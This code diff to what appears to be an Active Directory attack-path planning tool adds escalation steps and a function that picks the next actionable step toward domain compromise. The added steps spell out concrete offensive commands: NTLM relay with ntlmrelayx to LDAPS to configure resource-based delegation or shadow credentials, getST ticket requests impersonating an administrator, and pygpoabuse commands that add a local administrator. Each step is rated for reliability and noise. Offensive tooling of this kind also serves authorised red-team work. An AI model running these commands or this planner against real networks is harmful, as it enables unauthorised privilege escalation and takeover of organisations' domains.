@@ -63,6 +63,9 @@ class Capability(enum.Enum):
     RBCD = "rbcd"                                # resource-based constrained deleg
     COERCIBLE_AUTH = "coercible_auth"            # can coerce DC/host auth
     RELAY_TARGET = "relay_target"                # a relayable endpoint (no signing)
+    WEBDAV_HOST = "webdav_host"                  # host running WebClient (HTTP coercion)
+    LDAP_RELAY_TARGET = "ldap_relay_target"      # DC LDAP reachable for relay (no channel binding)
+    GPO_CONTROL = "gpo_control"                  # write control over a GPO / its link
 
     # --- goals -----------------------------------------------------------
     DCSYNC = "dcsync"                            # can replicate secrets (near-DA)
@@ -296,6 +299,27 @@ def starting_capabilities(
     return caps
 
 
+def next_best_action(
+    paths: list[AttackPath], held: Iterable[Capability]
+) -> PathStep | None:
+    """Return the single highest-value next step to run.
+
+    Given the ranked paths and the capabilities we already hold, walk the
+    best-ranked path and return its first step whose ``requires`` are already
+    satisfied but whose ``grants`` is not yet held. That is the immediate,
+    actionable move along the most reliable route to a goal.
+    """
+    held_set = set(held)
+    for path in paths:  # already sorted best-first by the engine
+        for step in path.steps:
+            if step.grants in held_set:
+                continue
+            if step.requires.issubset(held_set):
+                return step
+        # If no step in this path is immediately actionable, try the next path.
+    return None
+
+
 def build_engine(check_results: Iterable, include_baseline: bool = True) -> PathEngine:
     """Assemble a PathEngine from all steps emitted by the check results.
 
@@ -371,6 +395,97 @@ def baseline_steps() -> list[PathStep]:
             description="Coerce a DC/host to authenticate to an attacker-controlled listener.",
             reliability=Reliability.MODERATE,
             noise=Noise.LOUD,
+            source="baseline",
+        ),
+        # --- WebDAV / cross-protocol NTLM relay glue --------------------
+        # A WebClient host lets us trigger *HTTP* auth, which (unlike SMB) can
+        # be relayed to LDAP/LDAPS on a DC that lacks channel binding. That
+        # relay can write RBCD or add shadow credentials to escalate.
+        PathStep(
+            name="Trigger WebDAV/HTTP auth from a WebClient host",
+            technique="WebClientCoercion",
+            requires=frozenset({Capability.WEBDAV_HOST, Capability.LOW_PRIV_USER}),
+            grants=Capability.COERCIBLE_AUTH,
+            command=(
+                "# coerce the WebClient host to auth over HTTP to attacker@port "
+                "(e.g. PetitPotam/DFSCoerce with a WebDAV listener target)"
+            ),
+            description=(
+                "A host running the WebClient service can be coerced to "
+                "authenticate over HTTP, which is relayable to LDAP (SMB auth "
+                "is not)."
+            ),
+            reliability=Reliability.MODERATE,
+            noise=Noise.LOUD,
+            source="baseline",
+        ),
+        PathStep(
+            name="Relay coerced HTTP auth to LDAP -> configure RBCD",
+            technique="RelayToLDAP-RBCD",
+            requires=frozenset({Capability.COERCIBLE_AUTH, Capability.LDAP_RELAY_TARGET}),
+            grants=Capability.RBCD,
+            command=(
+                "ntlmrelayx.py -t ldaps://DC --delegate-access --no-dump "
+                "--no-da --no-acl"
+            ),
+            description=(
+                "Relay the coerced machine account authentication to LDAP(S) on "
+                "a DC without channel binding to configure resource-based "
+                "constrained delegation for a controlled account."
+            ),
+            reliability=Reliability.MODERATE,
+            noise=Noise.LOUD,
+            source="baseline",
+        ),
+        PathStep(
+            name="Relay coerced HTTP auth to LDAP -> shadow credentials",
+            technique="RelayToLDAP-ShadowCreds",
+            requires=frozenset({Capability.COERCIBLE_AUTH, Capability.LDAP_RELAY_TARGET}),
+            grants=Capability.RESET_PASSWORD,
+            command="ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'TARGET$'",
+            description=(
+                "Relay coerced auth to LDAP(S) to add a Key Credential (shadow "
+                "credentials) to a target, allowing PKINIT authentication as it."
+            ),
+            reliability=Reliability.MODERATE,
+            noise=Noise.LOUD,
+            source="baseline",
+        ),
+        PathStep(
+            name="RBCD -> impersonate privileged user on target host",
+            technique="RBCD-Impersonate",
+            requires=frozenset({Capability.RBCD, Capability.MACHINE_ACCOUNT}),
+            grants=Capability.LOCAL_ADMIN,
+            command="getST.py -spn cifs/TARGET -impersonate administrator DOMAIN/PWN$:PASS",
+            description=(
+                "With RBCD configured and a controlled machine account, request "
+                "a service ticket impersonating a privileged user to gain local "
+                "admin on the target."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.MODERATE,
+            source="baseline",
+        ),
+        # --- GPO abuse glue ---------------------------------------------
+        # Control over a GPO (or the ability to link one) that applies to a
+        # privileged OU lets us run code as those computers/users. If the GPO
+        # applies to Domain Controllers, that is effectively Domain Admin.
+        PathStep(
+            name="Abuse controlled GPO -> code execution on linked hosts",
+            technique="GPO-Abuse",
+            requires=frozenset({Capability.GPO_CONTROL}),
+            grants=Capability.LOCAL_ADMIN,
+            command=(
+                "pygpoabuse DOMAIN/USER:PASS -gpo-id <GPO-GUID> "
+                "-command 'net localgroup administrators PWN /add'"
+            ),
+            description=(
+                "Modify a GPO you control to run code on the computers/users it "
+                "applies to (scheduled task / startup script), yielding local "
+                "admin on those hosts."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.MODERATE,
             source="baseline",
         ),
     ]
